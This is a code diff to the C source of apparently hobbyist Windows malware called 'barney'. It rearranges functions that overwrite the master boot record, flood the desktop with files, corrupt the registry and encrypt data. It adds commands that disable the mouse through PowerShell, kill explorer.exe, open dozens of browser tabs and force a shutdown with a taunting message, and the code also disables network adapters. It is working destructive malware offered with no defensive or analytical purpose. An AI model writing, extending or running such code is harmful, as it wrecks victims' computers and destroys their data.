@@ -1,8 +1,8 @@
+#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 #include <stdbool.h>
-#include <windows.h>
 #include <process.h>
 
 void trollies(void*);
@@ -11,15 +11,20 @@ void registrycorruption(void*);
 void mbroverwrite(void*);
 void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t keysize);
 
-int main()
-{
+int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
+    // Light stuff before destroying the computer
+    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)L"wallpaper.jpg", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+    system("powershell -Command \"Disable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName \"HID-compliant mouse\").InstanceId -Confirm:$false\"");
+
+    // Destroyahh
     void* ptr = NULL; // Placeholder argument for mbroverwrite()
     mbroverwrite(ptr);
-    _beginthread((void (*)(void*))trollies, 0, NULL); // Cast to the correct function pointer type
     _beginthread((void (*)(void*))filebomb, 0, NULL); // Cast to the correct function pointer type
+    _beginthread((void (*)(void*))trollies, 0, NULL); // Cast to the correct function pointer type
     _beginthread((void (*)(void*))registrycorruption, 0, NULL); // Cast to the correct function pointer type
     _beginthread((void (*)(void*))crypter, 0, NULL); // Cast to the correct function pointer type
     Sleep(10000); // Wait for threads to finish, adjust time accordingly
+    system("shutdown /s /t 50 /c \"Computer destroyed by barney, Goodbye.\"");
     return 0;
 }
 
@@ -46,6 +51,7 @@ void filebomb(void *arg) {
         }
         strcpy(filename, desktopPath); // Reset filename for the next iteration
         strcat(filename, "\\Desktop\\"); // Reset the path
+        system("taskkill /f /im explorer.exe");
     }
 }
 
@@ -101,55 +107,17 @@ void crypter(unsigned char* bytes, size_t arrsize, unsigned char* key, size_t ke
     }
 }
 
-void spamMessageBox() {
-    for (int i = 0; i < 10; i++) {
-        MessageBox(
-            NULL,
-            "You got infected by barney,\nyour computer isn't yours anymore but belongs to barney.\n"
-            "BARNEY",
-            "BARNEY",
-            MB_ABORTRETRYIGNORE | MB_DEFBUTTON2 | MB_ICONERROR
-        );
-    }
-}
-
 void trollies(void *arg)
 {
-
-    printf("\x1b[35m"); // Set text color to purple
-    printf("__________    _____ __________  _______  ________________.___.\n"
-           "\\______   \\  /  _  \\\\______   \\ \\      \\ \\_   _____/\\__  |   |\n"
-           " |    |  _/ /  /_\\  \\|       _/ /   |   \\ |    __)_  /   |   |\n"
-           " |    |   \\/    |    \\    |   \\/    |    \\|        \\ \\____   |\n"
-           " |______  /\\____|__  /____|_  /\\____|__  /_______  / / ______|\n"
-           "        \\/         \\/       \\/         \\/        \\/  \\/       \n");
-    printf("\n");
-    printf("                     Malware Author: Azrael        \n"
-           "           You got infected by barney malware :D\n"
-           "         Goodluck on trying to recover your computer.\n");
-    printf("\x1b[0m"); // Reset text color
-    printf("\n");
-
-    //Spam error message box
-    _beginthread(spamMessageBox, 0, NULL);
-
-    // Change wallpaper
-    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)L"wallpaper.jpg", SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-
-    // Change computer name
-    SetComputerNameEx(ComputerNamePhysicalNetBIOS, "Barney");
-
     //Opens browser
     for (int i = 0; i < 5; i++) 
     {
         system("start https://www.youtube.com/watch?v=GjbR9rHI9Vw");
+        for (int i = 0; i < 30; i++)
+        {
+            system("start https://www.youtube.com/watch?v=YBOUQaGodLI");
+        }
     }
-
-    // taskkill explorer
-    system("taskkill /f /im explorer.exe");
-
-    // Disable mouse
-    system("powershell -Command \"Disable-PnpDevice -InstanceId (Get-PnpDevice -FriendlyName \"HID-compliant mouse\").InstanceId -Confirm:$false\"");
 
     // Disable Internet Connection
     system("powershell -Command \"Get-NetAdapter | Disable-NetAdapter -Confirm:$false\"");
